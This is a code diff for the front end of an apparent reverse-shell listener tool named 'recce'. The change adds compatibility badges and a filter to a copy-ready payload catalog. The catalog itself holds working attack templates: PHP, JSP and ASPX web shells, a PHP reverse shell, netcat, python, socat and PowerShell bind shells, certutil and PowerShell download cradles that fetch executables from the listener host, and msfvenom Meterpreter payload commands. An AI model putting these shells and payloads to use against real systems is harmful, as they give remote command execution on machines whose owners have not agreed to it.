@@ -1,7 +1,7 @@
 import { useEffect, useState } from "react";
 import { getStager } from "./api";
 
-type P = { label: string; tmpl: string; note?: string };
+type P = { label: string; tmpl: string; note?: string; compat?: "recce" | "external" | "reference" };
 const CATALOG: { group: string; items: P[] }[] = [
   {
     group: "Linux / Unix",
@@ -47,29 +47,29 @@ const CATALOG: { group: string; items: P[] }[] = [
   {
     group: "Web Shells",
     items: [
-      { label: "PHP webshell", tmpl: "<?php system($_GET['cmd']); ?>", note: "upload to web root, access via ?cmd=whoami" },
-      { label: "PHP reverse", tmpl: "<?php $s=fsockopen(\"{LHOST}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>", note: "upload and trigger via HTTP" },
-      { label: "JSP webshell", tmpl: "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", note: "Tomcat / JBoss" },
-      { label: "ASPX webshell", tmpl: "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]);%>", note: "IIS / .NET" },
+      { label: "PHP webshell", tmpl: "<?php system($_GET['cmd']); ?>", note: "HTTP cmd exec — upload to web root, ?cmd=whoami", compat: "reference" },
+      { label: "PHP reverse", tmpl: "<?php $s=fsockopen(\"{LHOST}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>", note: "upload then browse to trigger — calls back as TCP" },
+      { label: "JSP webshell", tmpl: "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", note: "HTTP cmd exec — Tomcat / JBoss", compat: "reference" },
+      { label: "ASPX webshell", tmpl: "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]);%>", note: "HTTP cmd exec — IIS / .NET", compat: "reference" },
     ],
   },
   {
     group: "Bind Shells",
     items: [
-      { label: "nc bind", tmpl: "nc -lvp {PORT} -e /bin/sh", note: "target listens, you connect" },
-      { label: "python bind", tmpl: "python3 -c 'import socket,os;s=socket.socket();s.bind((\"0.0.0.0\",{PORT}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system(\"/bin/sh -i\")'", note: "target listens on {PORT}" },
-      { label: "socat bind", tmpl: "socat TCP-LISTEN:{PORT},reuseaddr,fork EXEC:'/bin/sh',pty,stderr,setsid", note: "full PTY bind" },
-      { label: "PowerShell bind", tmpl: "powershell -c \"$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',{PORT});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$l.Stop()\"", note: "target listens on {PORT}" },
+      { label: "nc bind", tmpl: "nc -lvp {PORT} -e /bin/sh", note: "target listens — connect with: nc TARGET {PORT}", compat: "reference" },
+      { label: "python bind", tmpl: "python3 -c 'import socket,os;s=socket.socket();s.bind((\"0.0.0.0\",{PORT}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system(\"/bin/sh -i\")'", note: "target listens — connect with: nc TARGET {PORT}", compat: "reference" },
+      { label: "socat bind", tmpl: "socat TCP-LISTEN:{PORT},reuseaddr,fork EXEC:'/bin/sh',pty,stderr,setsid", note: "full PTY bind — connect with: socat - TCP:TARGET:{PORT}", compat: "reference" },
+      { label: "PowerShell bind", tmpl: "powershell -c \"$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',{PORT});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$l.Stop()\"", note: "target listens — connect with: nc TARGET {PORT}", compat: "reference" },
     ],
   },
   {
     group: "File Transfer",
     items: [
-      { label: "python HTTP server", tmpl: "python3 -m http.server {PORT}", note: "serve files from current directory" },
-      { label: "certutil download", tmpl: "certutil -urlcache -split -f http://{LHOST}:{PORT}/file.exe C:\\Windows\\Temp\\file.exe", note: "Windows LOLBin" },
-      { label: "PS download", tmpl: "(New-Object Net.WebClient).DownloadFile(\"http://{LHOST}:{PORT}/file.exe\",\"C:\\Windows\\Temp\\file.exe\")", note: "IWR alternative" },
-      { label: "curl download", tmpl: "curl -o /tmp/file http://{LHOST}:{PORT}/file" },
-      { label: "scp", tmpl: "scp user@{LHOST}:/path/to/file /tmp/file", note: "needs SSH access to attacker" },
+      { label: "python HTTP server", tmpl: "python3 -m http.server {PORT}", note: "serve files from current directory", compat: "reference" },
+      { label: "certutil download", tmpl: "certutil -urlcache -split -f http://{LHOST}:{PORT}/file.exe C:\\Windows\\Temp\\file.exe", note: "Windows LOLBin", compat: "reference" },
+      { label: "PS download", tmpl: "(New-Object Net.WebClient).DownloadFile(\"http://{LHOST}:{PORT}/file.exe\",\"C:\\Windows\\Temp\\file.exe\")", note: "IWR alternative", compat: "reference" },
+      { label: "curl download", tmpl: "curl -o /tmp/file http://{LHOST}:{PORT}/file", compat: "reference" },
+      { label: "scp", tmpl: "scp user@{LHOST}:/path/to/file /tmp/file", note: "needs SSH access to attacker", compat: "reference" },
     ],
   },
   {
@@ -86,8 +86,8 @@ const CATALOG: { group: string; items: P[] }[] = [
       { label: "ASP", tmpl: "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f asp -o shell.asp", note: "classic ASP (IIS)" },
       { label: "ASPX", tmpl: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f aspx -o shell.aspx", note: ".NET web shell" },
       { label: "HTA", tmpl: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f hta-psh -o shell.hta", note: "for mshta delivery" },
-      { label: "Meterpreter x64", tmpl: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={PORT} -f exe -o meterpreter.exe", note: "staged — needs handler" },
-      { label: "Meterpreter Linux", tmpl: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={PORT} -f elf -o meterpreter.elf" },
+      { label: "Meterpreter x64", tmpl: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={PORT} -f exe -o meterpreter.exe", note: "needs Metasploit multi/handler", compat: "external" },
+      { label: "Meterpreter Linux", tmpl: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={PORT} -f elf -o meterpreter.elf", note: "needs Metasploit multi/handler", compat: "external" },
     ],
   },
 ];
@@ -115,9 +115,9 @@ const TLS_CATALOG: { group: string; items: P[] }[] = [
   {
     group: "msfvenom TLS (compiled)",
     items: [
-      { label: "Linux ELF x64 (staged)", tmpl: "msfvenom -p linux/x64/shell/reverse_tcp LHOST={LHOST} LPORT={PORT} EnableStageEncoding=true -f elf -o shell.elf", note: "use multi/handler with same payload" },
-      { label: "Windows EXE x64 (staged)", tmpl: "msfvenom -p windows/x64/shell/reverse_tcp LHOST={LHOST} LPORT={PORT} EnableStageEncoding=true -f exe -o shell.exe" },
-      { label: "Meterpreter HTTPS", tmpl: "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={PORT} -f exe -o meterpreter.exe", note: "HTTPS transport — blends with web traffic" },
+      { label: "Linux ELF x64 (staged)", tmpl: "msfvenom -p linux/x64/shell/reverse_tcp LHOST={LHOST} LPORT={PORT} EnableStageEncoding=true -f elf -o shell.elf", note: "staged — needs Metasploit multi/handler", compat: "external" },
+      { label: "Windows EXE x64 (staged)", tmpl: "msfvenom -p windows/x64/shell/reverse_tcp LHOST={LHOST} LPORT={PORT} EnableStageEncoding=true -f exe -o shell.exe", note: "staged — needs Metasploit multi/handler", compat: "external" },
+      { label: "Meterpreter HTTPS", tmpl: "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={PORT} -f exe -o meterpreter.exe", note: "needs Metasploit multi/handler — HTTPS transport", compat: "external" },
     ],
   },
 ];
@@ -213,8 +213,16 @@ export function MsfvenomBuilder({ lhost, port }: { lhost: string; port: number }
   let cmd = `msfvenom -p ${opt?.payload || "UNKNOWN"} LHOST=${customLhost} LPORT=${customPort} -f ${opt?.format || "raw"} -o ${fname}`;
   if (encoder) cmd += ` -e ${encoder} -i ${iterations}`;
 
+  const payloadName = opt?.payload || "";
+  const isRecce = !payloadName.includes("meterpreter") && !payloadName.match(/shell\/reverse/);
+
   return (
     <div className="venom-gen">
+      <div className={`venom-compat ${isRecce ? "compat-ok" : "compat-ext"}`}>
+        {isRecce
+          ? "recce-compatible — catches directly on the listener"
+          : "needs Metasploit multi/handler — won't catch on recce's listener"}
+      </div>
       <div className="venom-form">
         <div className="venom-field">
           <label>Platform</label>
@@ -295,11 +303,31 @@ function CopyLine({ text }: { text: string }) {
   );
 }
 
+const COMPAT_LABEL: Record<string, string> = {
+  recce: "recce",
+  external: "ext handler",
+  reference: "ref",
+};
+const COMPAT_TITLE: Record<string, string> = {
+  recce: "Catches directly on recce's listener — becomes a session",
+  external: "Needs an external handler (e.g. Metasploit multi/handler)",
+  reference: "Utility / reference — doesn't create a recce session",
+};
+
+function CompatBadge({ compat }: { compat: string }) {
+  return (
+    <span className={`compat-badge compat-${compat}`} title={COMPAT_TITLE[compat] || ""}>
+      {COMPAT_LABEL[compat] || compat}
+    </span>
+  );
+}
+
 export function PayloadCatalog({ port, tls = false }: { port: number; tls?: boolean }) {
   const [lhost, setLhost] = useState(location.hostname);
   const [token] = useState(genToken);
   const [stager, setStager] = useState<string>("");
   const [collapsed, setCollapsed] = useState<Record<string, boolean>>({});
+  const [compatFilter, setCompatFilter] = useState<"all" | "recce" | "external" | "reference">("all");
   useEffect(() => { getStager(tls).then(setStager).catch(() => setStager("")); }, [tls]);
   const fill = (t: string) =>
     t.split("{LHOST}").join(lhost).split("{PORT}").join(String(port)).split("{TOKEN}").join(token);
@@ -307,6 +335,8 @@ export function PayloadCatalog({ port, tls = false }: { port: number; tls?: bool
 
   const toggle = (group: string) =>
     setCollapsed((c) => ({ ...c, [group]: !c[group] }));
+
+  const filterItem = (p: P) => compatFilter === "all" || (p.compat || "recce") === compatFilter;
 
   return (
     <div className="payload-catalog">
@@ -316,42 +346,76 @@ export function PayloadCatalog({ port, tls = false }: { port: number; tls?: bool
         {tls && <span className="muted small">encrypted listener — use TLS payloads</span>}
       </label>
 
-      <div className="payload-group">
-        <div className="payload-group-h robust">★ Robust · auto-reconnect PTY{tls ? " · TLS" : ""} (recommended)</div>
-        <div className="payload-item robust-item">
-          <span className="payload-label">python</span>
-          <code className="payload-code">{stager ? fill(stager) : "loading…"}</code>
-          <span className="payload-note muted small">full PTY + resize, self-healing{tls ? ", encrypted" : ""} — survives drops &amp; rebinds</span>
-          {stager && <CopyLine text={fill(stager)} />}
-        </div>
+      <div className="payload-compat-bar">
+        <span className="payload-compat-label">Show:</span>
+        <button className={`compat-filter ${compatFilter === "all" ? "active" : ""}`}
+                onClick={() => setCompatFilter("all")}>All</button>
+        <button className={`compat-filter compat-recce ${compatFilter === "recce" ? "active" : ""}`}
+                onClick={() => setCompatFilter("recce")}>recce-compatible</button>
+        <button className={`compat-filter compat-external ${compatFilter === "external" ? "active" : ""}`}
+                onClick={() => setCompatFilter("external")}>external handler</button>
+        <button className={`compat-filter compat-reference ${compatFilter === "reference" ? "active" : ""}`}
+                onClick={() => setCompatFilter("reference")}>reference / utility</button>
       </div>
 
-      {catalog.map((g) => (
-        <div key={g.group} className="payload-group">
-          <button className="payload-group-h payload-group-toggle" onClick={() => toggle(g.group)}>
-            <span className="payload-caret">{collapsed[g.group] ? "▸" : "▾"}</span>
-            {g.group}
-            <span className="payload-group-ct">{g.items.length}</span>
+      {compatFilter === "all" && (
+        <div className="payload-group">
+          <div className="payload-group-h robust">★ Robust · auto-reconnect PTY{tls ? " · TLS" : ""} (recommended)</div>
+          <div className="payload-item robust-item">
+            <span className="payload-label">python</span>
+            <CompatBadge compat="recce" />
+            <code className="payload-code">{stager ? fill(stager) : "loading…"}</code>
+            <span className="payload-note muted small">full PTY + resize, self-healing{tls ? ", encrypted" : ""} — survives drops &amp; rebinds</span>
+            {stager && <CopyLine text={fill(stager)} />}
+          </div>
+        </div>
+      )}
+      {compatFilter === "recce" && (
+        <div className="payload-group">
+          <div className="payload-group-h robust">★ Robust · auto-reconnect PTY{tls ? " · TLS" : ""} (recommended)</div>
+          <div className="payload-item robust-item">
+            <span className="payload-label">python</span>
+            <CompatBadge compat="recce" />
+            <code className="payload-code">{stager ? fill(stager) : "loading…"}</code>
+            <span className="payload-note muted small">full PTY + resize, self-healing{tls ? ", encrypted" : ""} — survives drops &amp; rebinds</span>
+            {stager && <CopyLine text={fill(stager)} />}
+          </div>
+        </div>
+      )}
+
+      {catalog.map((g) => {
+        const visible = g.items.filter(filterItem);
+        if (visible.length === 0) return null;
+        return (
+          <div key={g.group} className="payload-group">
+            <button className="payload-group-h payload-group-toggle" onClick={() => toggle(g.group)}>
+              <span className="payload-caret">{collapsed[g.group] ? "▸" : "▾"}</span>
+              {g.group}
+              <span className="payload-group-ct">{visible.length}{visible.length !== g.items.length ? `/${g.items.length}` : ""}</span>
+            </button>
+            {!collapsed[g.group] && visible.map((p) => (
+              <div key={p.label} className={`payload-item ${(p.compat || "recce") !== "recce" ? "payload-dim" : ""}`}>
+                <span className="payload-label">{p.label}</span>
+                <CompatBadge compat={p.compat || "recce"} />
+                <code className="payload-code">{fill(p.tmpl)}</code>
+                {p.note && <span className="payload-note muted small">{p.note}</span>}
+                <CopyLine text={fill(p.tmpl)} />
+              </div>
+            ))}
+          </div>
+        );
+      })}
+
+      {compatFilter === "all" && (
+        <div className="payload-group">
+          <button className="payload-group-h payload-group-toggle" onClick={() => toggle("_venom_builder")}>
+            <span className="payload-caret">{collapsed["_venom_builder"] ? "▸" : "▾"}</span>
+            msfvenom Command Builder
+            <span className="payload-group-ct">interactive</span>
           </button>
-          {!collapsed[g.group] && g.items.map((p) => (
-            <div key={p.label} className="payload-item">
-              <span className="payload-label">{p.label}</span>
-              <code className="payload-code">{fill(p.tmpl)}</code>
-              {p.note && <span className="payload-note muted small">{p.note}</span>}
-              <CopyLine text={fill(p.tmpl)} />
-            </div>
-          ))}
+          {!collapsed["_venom_builder"] && <MsfvenomBuilder lhost={lhost} port={port} />}
         </div>
-      ))}
-
-      <div className="payload-group">
-        <button className="payload-group-h payload-group-toggle" onClick={() => toggle("_venom_builder")}>
-          <span className="payload-caret">{collapsed["_venom_builder"] ? "▸" : "▾"}</span>
-          msfvenom Command Builder
-          <span className="payload-group-ct">interactive</span>
-        </button>
-        {!collapsed["_venom_builder"] && <MsfvenomBuilder lhost={lhost} port={port} />}
-      </div>
+      )}
     </div>
   );
 }
